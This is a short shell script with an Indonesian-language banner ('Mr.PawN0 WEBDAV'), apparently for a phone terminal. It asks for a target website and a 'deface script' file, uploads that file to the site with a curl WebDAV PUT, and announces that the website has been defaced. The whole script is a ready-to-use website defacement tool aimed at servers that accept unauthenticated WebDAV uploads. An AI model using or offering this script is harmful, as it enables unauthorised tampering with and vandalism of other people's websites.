clear
figlet -f slant 'Mr.PawN0 WEBDAV' | lolcat
read -p 'MASUKKAN WEB NYA BRO ==> ' target;
read -p 'MASUKKAN SCRIPT DEFACE LU BRO ==>> ' sc;
curl -T /sdcard/$sc $target
echo '[+] OKE WEBSITE BERHASIL DI DEFACE DENGAN METODE WEBDAV ==>> ' $target/$sc
